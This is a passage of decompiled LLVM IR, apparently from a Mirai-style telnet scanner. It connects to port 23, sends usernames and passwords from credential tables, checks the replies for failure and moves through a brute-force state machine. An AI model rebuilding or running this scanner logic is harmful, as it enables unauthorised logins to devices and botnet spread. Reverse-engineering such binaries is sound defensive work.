  store i32 %v2_b49c, i32* %r3.global-to-local, align 4
  %v2_b4a0 = inttoptr i32 %v2_b49c to i32*
  store i32 %v5_b478, i32* %v2_b4a0, align 4
  br label %dec_label_pc_b634

dec_label_pc_b4a8:                                ; preds = %dec_label_pc_b390
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b4c8 = load i8, i8* %v2_b3b0, align 1
  %v4_b4c8 = zext i8 %v3_b4c8 to i32
  store i32 %v4_b4c8, i32* %r3.global-to-local, align 4
  %v2_b4cc = icmp eq i8 %v3_b4c8, 0
  br i1 %v2_b4cc, label %dec_label_pc_b4d4, label %dec_label_pc_b634

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b4a8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b4f8 = add i32 %v2_b2f4, 11
  %v2_b4f8 = inttoptr i32 %v1_b4f8 to i8*
  %v3_b4f8 = load i8, i8* %v2_b4f8, align 1
  %v1_b4fc = add i8 %v3_b4f8, 1
  store i8 %v1_b4fc, i8* %v2_b4f8, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v1_b550 = add i32 %v2_b2f4, 10
  %v2_b550 = inttoptr i32 %v1_b550 to i8*
  %v3_b550 = load i8, i8* %v2_b550, align 2
  %v1_b554 = add i8 %v3_b550, 1
  store i32 %v3_b18c, i32* %ip.global-to-local, align 4
  store i8 %v1_b554, i8* %v2_b550, align 2
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b5a4 = load i8, i8* %v2_b4f8, align 1
  %v7_b5a8 = icmp eq i8 %v3_b5a4, 9
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v7_b5a8, label %dec_label_pc_b5b0, label %dec_label_pc_b5dc

dec_label_pc_b5b0:                                ; preds = %dec_label_pc_b4d4
  store i32 %v2_b3ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b3b0, align 1
  br label %dec_label_pc_c460

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b4d4
  store i32 %v2_b3ac, i32* %r3.global-to-local, align 4
  %v3_b5fc = load i8, i8* %v2_b550, align 2
  %v4_b5fc = zext i8 %v3_b5fc to i32
  store i32 %v4_b5fc, i32* %r3.global-to-local, align 4
  %v7_b600 = icmp eq i8 %v3_b5fc, 9
  br i1 %v7_b600, label %dec_label_pc_b608, label %dec_label_pc_b634

dec_label_pc_b608:                                ; preds = %dec_label_pc_b5dc
  store i32 %v2_b3ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_b3b0, align 1
  br label %dec_label_pc_c460

dec_label_pc_b634:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b4a8, %dec_label_pc_b3bc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b648 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_b690 = add i32 %v2_b68c, %v2_b2f0
  store i32 %v2_b690, i32* %r3.global-to-local, align 4
  %v1_b694 = inttoptr i32 %v2_b690 to i32*
  %v2_b694 = load i32, i32* %v1_b694, align 4
  store i32 %v2_b694, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_b6ac = call i32 @socket()
  %v0_b6b4 = load i32, i32* @r4, align 4
  %v2_b6c0 = mul i32 %v0_b6b4, 28
  %v2_b6c4 = add i32 %v2_b6c0, %v3_b18c
  %v2_b6c8 = inttoptr i32 %v2_b6c4 to i32*
  store i32 %v0_b6ac, i32* %v2_b6c8, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_b6e4 = inttoptr i32 %v2_b2f4 to i32*
  %v2_b6e4 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b6e4, i32* %r3.global-to-local, align 4
  %v7_b6e8 = icmp eq i32 %v2_b6e4, -1
  br i1 %v7_b6e8, label %dec_label_pc_c460, label %dec_label_pc_b6f0

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b634
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b708 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b708, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b724 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b724, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b734 = call i32 @__libc_fcntl(i32 %v2_b724, i32 3)
  %v1_b73c = or i32 %v2_b734, 2048
  store i32 %v1_b73c, i32* %r3.global-to-local, align 4
  %v0_b740 = load i32, i32* @r4, align 4
  store i32 %v1_b73c, i32* @r2, align 4
  %v2_b74c = call i32 @__libc_fcntl(i32 %v0_b740, i32 4)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b768 = load i32, i32* %v1_b6e4, align 4
  store i32 %v2_b768, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_b77c = call i32 @__libc_connect(i32 %v2_b768, %sockaddr* nonnull %v3_b77c, i32 16)
  store i32 %v4_b77c, i32* %r3.global-to-local, align 4
  %v3_b784 = icmp eq i32 %v4_b77c, -1
  br i1 %v3_b784, label %dec_label_pc_b78c, label %dec_label_pc_b7c4

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b6f0
  %v0_b78c = call i32 @__errno_location()
  store i32 %v0_b78c, i32* %r3.global-to-local, align 4
  %v1_b794 = inttoptr i32 %v0_b78c to i32*
  %v2_b794 = load i32, i32* %v1_b794, align 4
  store i32 %v2_b794, i32* %r3.global-to-local, align 4
  %v7_b798 = icmp eq i32 %v2_b794, 115
  br i1 %v7_b798, label %dec_label_pc_b7c4, label %dec_label_pc_b7a0

dec_label_pc_b7a0:                                ; preds = %dec_label_pc_b78c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b7bc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_b7c4:                                ; preds = %dec_label_pc_b6f0, %dec_label_pc_b78c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b7e4 = call i32 @advance_state(i32* nonnull %v1_b6e4, i32 1)
  br label %dec_label_pc_c460

dec_label_pc_b800.lr.ph:                          ; preds = %dec_label_pc_b340
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b800

dec_label_pc_b800:                                ; preds = %dec_label_pc_b800.lr.ph, %dec_label_pc_b800
  %storemerge610 = phi i32 [ 0, %dec_label_pc_b800.lr.ph ], [ %v1_b814, %dec_label_pc_b800 ]
  store i32 %v2_b7ec, i32* %r2.global-to-local, align 4
  %v5_b80c = mul nuw nsw i32 %storemerge610, 4
  %v6_b80c = add i32 %v5_b80c, %v2_b7ec
  %v7_b80c = inttoptr i32 %v6_b80c to i32*
  store i32 0, i32* %v7_b80c, align 4
  %v1_b814 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_b814, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_b814, 32
  br i1 %tmp43, label %dec_label_pc_b800, label %dec_label_pc_b828

dec_label_pc_b828:                                ; preds = %dec_label_pc_b800
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_b840 = inttoptr i32 %v2_b2f4 to i32*
  %v2_b840 = load i32, i32* %v1_b840, align 4
  %v3_b844 = udiv i32 %v2_b840, 32
  %v3_b858 = mul nuw nsw i32 %v3_b844, 4
  %v2_b860 = add i32 %v3_b858, %v19_b0a4
  store i32 %v2_b860, i32* %r2.global-to-local, align 4
  %v2_b864 = add i32 %v2_b860, -300
  store i32 %v2_b864, i32* %r3.global-to-local, align 4
  %v1_b868 = inttoptr i32 %v2_b864 to i32*
  %v2_b868 = load i32, i32* %v1_b868, align 4
  store i32 %v2_b868, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b884 = load i32, i32* %v1_b840, align 4
  %v1_b888 = urem i32 %v2_b884, 32
  %v6_b890 = shl i32 1, %v1_b888
  %v2_b894 = or i32 %v6_b890, %v2_b868
  store i32 %v2_b894, i32* %v1_b868, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b8dc = load i32, i32* %v1_b840, align 4
  %v1_b8e0 = add i32 %v2_b8dc, 1
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ec, i32* %ip.global-to-local, align 4
  %v1_b8ec = load i32, i32* @sp, align 4
  %v2_b8ec = inttoptr i32 %v1_b8ec to i32*
  store i32 %v2_b8e8, i32* %v2_b8ec, align 4
  %v0_b8f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_b7ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_b900 = load i32, i32* %stack_var_-332, align 4
  %v5_b900 = call i32 @__libc_select(i32 %v0_b8f0, i32 0, i32 %v2_b7ec, i32 0, i32 %v4_b900)
  store i32 %v5_b900, i32* %r3.global-to-local, align 4
  %v7_b910 = icmp eq i32 %v5_b900, 1
  br i1 %v7_b910, label %dec_label_pc_b918, label %dec_label_pc_ba1c

dec_label_pc_b918:                                ; preds = %dec_label_pc_b828
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b940 = load i32, i32* %v1_b840, align 4
  store i32 %v2_b940, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %ip.global-to-local, align 4
  %v1_b94c = load i32, i32* @sp, align 4
  %v2_b94c = inttoptr i32 %v1_b94c to i32*
  store i32 %v2_b948, i32* %v2_b94c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_b944, i32* %r3.global-to-local, align 4
  %v0_b960 = call i32 @getsockopt()
  %v3_b964 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_b964, i32* %r3.global-to-local, align 4
  %v2_b968 = icmp eq i32 %v3_b964, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  br i1 %v2_b968, label %dec_label_pc_b994, label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_b918
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_b98c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_b994:                                ; preds = %dec_label_pc_b918
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b9ac = load i32, i32* %v1_b840, align 4
  store i32 %v2_b9ac, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_b9c8 = load i32, i32* %v1_b840, align 4
  store i32 %v2_b9c8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b9d8 = call i32 @__libc_fcntl(i32 %v2_b9c8, i32 3)
  %v1_b9e0 = and i32 %v2_b9d8, -2049
  store i32 %v1_b9e0, i32* %r3.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v1_b9e0, i32* @r2, align 4
  %v2_b9f0 = call i32 @__libc_fcntl(i32 %v0_b9e4, i32 4)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_ba14 = call i32 @advance_state(i32* nonnull %v1_b840, i32 2)
  br label %dec_label_pc_c460

dec_label_pc_ba1c:                                ; preds = %dec_label_pc_b828
  store i32 %v5_b900, i32* %r3.global-to-local, align 4
  %v3_ba20 = icmp eq i32 %v5_b900, -1
  br i1 %v3_ba20, label %dec_label_pc_ba28, label %dec_label_pc_ba4c

dec_label_pc_ba28:                                ; preds = %dec_label_pc_ba1c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_ba44 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba1c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_ba68 = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_ba68, i32* %r3.global-to-local, align 4
  %v1_ba6c = inttoptr i32 %v2_ba68 to i32*
  %v2_ba6c = load i32, i32* %v1_ba6c, align 4
  store i32 %v2_ba6c, i32* %r3.global-to-local, align 4
  %v1_ba70 = add i32 %v2_ba6c, 5
  store i32 %v1_ba70, i32* @r4, align 4
  %v2_ba78 = call i32 @__GI_time(i32* null)
  store i32 %v2_ba78, i32* %r3.global-to-local, align 4
  %v0_ba80 = load i32, i32* @r4, align 4
  %v3_ba80 = icmp ult i32 %v0_ba80, %v2_ba78
  br i1 %v3_ba80, label %dec_label_pc_ba88, label %dec_label_pc_c460

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_baa4 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_baac:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bac4 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bac4 = load i32, i32* %v1_bac4, align 4
  store i32 %v2_bac4, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bae4 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_bae4, i32* %r3.global-to-local, align 4
  %v1_bae8 = inttoptr i32 %v2_bae4 to i32*
  %v2_bae8 = load i32, i32* %v1_bae8, align 4
  store i32 %v2_bae8, i32* %r2.global-to-local, align 4
  %v1_baf0 = load i32, i32* @sp, align 4
  %v2_baf0 = inttoptr i32 %v1_baf0 to i32*
  store i32 ptrtoint (i32* @global_var_23134 to i32), i32* %v2_baf0, align 4
  %v0_baf4 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bb00 = inttoptr i32 %v2_bae8 to i8*
  %v5_bb00 = call i32 @read_until_response(i32 %v0_baf4, i32 %arg1, i8* %v4_bb00, i32 1024)
  %v2_bb08 = icmp eq i32 %v5_bb00, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bb08, label %dec_label_pc_bb98, label %dec_label_pc_bb10

dec_label_pc_bb10:                                ; preds = %dec_label_pc_baac
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bb2c = add i32 %v2_b2f4, 24
  store i32 %v2_bb2c, i32* %r3.global-to-local, align 4
  %v1_bb30 = inttoptr i32 %v2_bb2c to i32*
  %v2_bb30 = load i32, i32* %v1_bb30, align 4
  store i32 %v2_bb30, i32* %r3.global-to-local, align 4
  %v1_bb38 = call i32 @contains_fail(i32 %v2_bb30)
  %v2_bb40 = icmp eq i32 %v1_bb38, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v2_bb40, label %dec_label_pc_bb70, label %dec_label_pc_bb48

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bb10
  %v3_bb68 = call i32 @advance_state(i32* %v1_bac4, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb10
  %v3_bb90 = call i32 @advance_state(i32* %v1_bac4, i32 3)
  br label %dec_label_pc_c460

dec_label_pc_bb98:                                ; preds = %dec_label_pc_baac
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v2_bbb8 = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_bbb8, i32* %r3.global-to-local, align 4
  %v1_bbbc = add i32 %v2_bbb8, 7
  store i32 %v1_bbbc, i32* @r4, align 4
  %v2_bbc4 = call i32 @__GI_time(i32* null)
  store i32 %v2_bbc4, i32* %r3.global-to-local, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  %v3_bbcc = icmp ult i32 %v0_bbcc, %v2_bbc4
  br i1 %v3_bbcc, label %dec_label_pc_bbd4, label %dec_label_pc_c460

dec_label_pc_bbd4:                                ; preds = %dec_label_pc_bb98
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_bbf0 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bc10 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bc10 = load i32, i32* %v1_bc10, align 4
  store i32 %v2_bc10, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bc30 = add i32 %v2_b2f4, 8
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v1_bc34 = add i32 %v2_b2f4, 10
  %v2_bc34 = inttoptr i32 %v1_bc34 to i8*
  %v3_bc34 = load i8, i8* %v2_bc34, align 2
  %v4_bc34 = zext i8 %v3_bc34 to i32
  store i32 %v4_bc34, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32), i32* %r3.global-to-local, align 4
  %v4_bc40 = mul nuw nsw i32 %v4_bc34, 4
  %v5_bc40 = add i32 %v4_bc40, ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32)
  %v6_bc40 = inttoptr i32 %v5_bc40 to i32*
  %v7_bc40 = load i32, i32* %v6_bc40, align 4
  store i32 %v7_bc40, i32* @r5, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_bc30, i32* %r3.global-to-local, align 4
  %v3_bc64 = load i8, i8* %v2_bc34, align 2
  %v4_bc64 = zext i8 %v3_bc64 to i32
  store i32 %v4_bc64, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32), i32* %r3.global-to-local, align 4
  %v4_bc70 = mul nuw nsw i32 %v4_bc64, 4
  %v5_bc70 = add i32 %v4_bc70, ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32)
  %v6_bc70 = inttoptr i32 %v5_bc70 to i32*
  %v7_bc70 = load i32, i32* %v6_bc70, align 4
  store i32 %v7_bc70, i32* %r3.global-to-local, align 4
  %v1_bc74 = inttoptr i32 %v7_bc70 to i8*
  %v3_bc78 = call i32 @strlen(i8* %v1_bc74)
  %v0_bc80 = load i32, i32* @r4, align 4
  %v0_bc84 = load i32, i32* @r5, align 4
  store i32 %v3_bc78, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bc90 = inttoptr i32 %v0_bc84 to i32*
  %v5_bc90 = call i32 @__libc_send(i32 %v0_bc80, i32* %v4_bc90, i32 %v3_bc78, i32 16384)
  %v1_bc98 = icmp slt i32 %v5_bc90, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bc98, label %dec_label_pc_bca0, label %dec_label_pc_bcc4

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bbf8
  %v3_bcbc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bcc4:                                ; preds = %dec_label_pc_bbf8
  %v2_bcdc = load i32, i32* %v1_bc10, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bcf0 = call i32 @__libc_send(i32 %v2_bcdc, i32* bitcast ([3 x i8]* @global_var_19480.109 to i32*), i32 2, i32 16384)
  %v1_bcf8 = icmp slt i32 %v6_bcf0, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bcf8, label %dec_label_pc_bd00, label %dec_label_pc_bd24

dec_label_pc_bd00:                                ; preds = %dec_label_pc_bcc4
  %v3_bd1c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcc4
  %v3_bd44 = call i32 @advance_state(i32* nonnull %v1_bc10, i32 4)
  br label %dec_label_pc_c460

dec_label_pc_bd4c:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_bd64 = inttoptr i32 %v2_b2f4 to i32*
  %v2_bd64 = load i32, i32* %v1_bd64, align 4
  store i32 %v2_bd64, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bd84 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_bd84, i32* %r3.global-to-local, align 4
  %v1_bd88 = inttoptr i32 %v2_bd84 to i32*
  %v2_bd88 = load i32, i32* %v1_bd88, align 4
  store i32 %v2_bd88, i32* %r2.global-to-local, align 4
  %v1_bd90 = load i32, i32* @sp, align 4
  %v2_bd90 = inttoptr i32 %v1_bd90 to i32*
  store i32 ptrtoint (i32* @global_var_23134 to i32), i32* %v2_bd90, align 4
  %v0_bd94 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bda0 = inttoptr i32 %v2_bd88 to i8*
  %v5_bda0 = call i32 @read_until_response(i32 %v0_bd94, i32 %arg1, i8* %v4_bda0, i32 1024)
  %v2_bda8 = icmp eq i32 %v5_bda0, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_bda8, label %dec_label_pc_be38, label %dec_label_pc_bdb0

dec_label_pc_bdb0:                                ; preds = %dec_label_pc_bd4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bdcc = add i32 %v2_b2f4, 24
  store i32 %v2_bdcc, i32* %r3.global-to-local, align 4
  %v1_bdd0 = inttoptr i32 %v2_bdcc to i32*
  %v2_bdd0 = load i32, i32* %v1_bdd0, align 4
  store i32 %v2_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd8 = call i32 @contains_fail(i32 %v2_bdd0)
  %v2_bde0 = icmp eq i32 %v1_bdd8, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v2_bde0, label %dec_label_pc_be10, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdb0
  %v3_be08 = call i32 @advance_state(i32* %v1_bd64, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_be10:                                ; preds = %dec_label_pc_bdb0
  %v3_be30 = call i32 @advance_state(i32* %v1_bd64, i32 5)
  br label %dec_label_pc_c460

dec_label_pc_be38:                                ; preds = %dec_label_pc_bd4c
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f8, i32* %r3.global-to-local, align 4
  %v2_be58 = load i32, i32* %v1_b2fc, align 4
  store i32 %v2_be58, i32* %r3.global-to-local, align 4
  %v1_be5c = add i32 %v2_be58, 3
  store i32 %v1_be5c, i32* @r4, align 4
  %v2_be64 = call i32 @__GI_time(i32* null)
  store i32 %v2_be64, i32* %r3.global-to-local, align 4
  %v0_be6c = load i32, i32* @r4, align 4
  %v3_be6c = icmp ult i32 %v0_be6c, %v2_be64
  br i1 %v3_be6c, label %dec_label_pc_be74, label %dec_label_pc_c460

dec_label_pc_be74:                                ; preds = %dec_label_pc_be38
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_be90 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_be98:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_beb0 = inttoptr i32 %v2_b2f4 to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  store i32 %v2_beb0, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_bed0 = add i32 %v2_b2f4, 8
  store i32 %v2_bed0, i32* %r3.global-to-local, align 4
  %v1_bed4 = add i32 %v2_b2f4, 11
  %v2_bed4 = inttoptr i32 %v1_bed4 to i8*
  %v3_bed4 = load i8, i8* %v2_bed4, align 1
  %v4_bed4 = zext i8 %v3_bed4 to i32
  store i32 %v4_bed4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32), i32* %r3.global-to-local, align 4
  %v4_bee0 = mul nuw nsw i32 %v4_bed4, 4
  %v5_bee0 = add i32 %v4_bee0, ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32)
  %v6_bee0 = inttoptr i32 %v5_bee0 to i32*
  %v7_bee0 = load i32, i32* %v6_bee0, align 4
  store i32 %v7_bee0, i32* @r5, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_bed0, i32* %r3.global-to-local, align 4
  %v3_bf04 = load i8, i8* %v2_bed4, align 1
  %v4_bf04 = zext i8 %v3_bf04 to i32
  store i32 %v4_bf04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32), i32* %r3.global-to-local, align 4
  %v4_bf10 = mul nuw nsw i32 %v4_bf04, 4
  %v5_bf10 = add i32 %v4_bf10, ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32)
  %v6_bf10 = inttoptr i32 %v5_bf10 to i32*
  %v7_bf10 = load i32, i32* %v6_bf10, align 4
  store i32 %v7_bf10, i32* %r3.global-to-local, align 4
  %v1_bf14 = inttoptr i32 %v7_bf10 to i8*
  %v3_bf18 = call i32 @strlen(i8* %v1_bf14)
  %v0_bf20 = load i32, i32* @r4, align 4
  %v0_bf24 = load i32, i32* @r5, align 4
  store i32 %v3_bf18, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_bf30 = inttoptr i32 %v0_bf24 to i32*
  %v5_bf30 = call i32 @__libc_send(i32 %v0_bf20, i32* %v4_bf30, i32 %v3_bf18, i32 16384)
  %v1_bf38 = icmp slt i32 %v5_bf30, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bf38, label %dec_label_pc_bf40, label %dec_label_pc_bf64

dec_label_pc_bf40:                                ; preds = %dec_label_pc_be98
  %v3_bf5c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bf64:                                ; preds = %dec_label_pc_be98
  %v2_bf7c = load i32, i32* %v1_beb0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bf90 = call i32 @__libc_send(i32 %v2_bf7c, i32* bitcast ([3 x i8]* @global_var_19480.109 to i32*), i32 2, i32 16384)
  %v1_bf98 = icmp slt i32 %v6_bf90, 0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  br i1 %v1_bf98, label %dec_label_pc_bfa0, label %dec_label_pc_bfc4

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf64
  %v3_bfbc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bf64
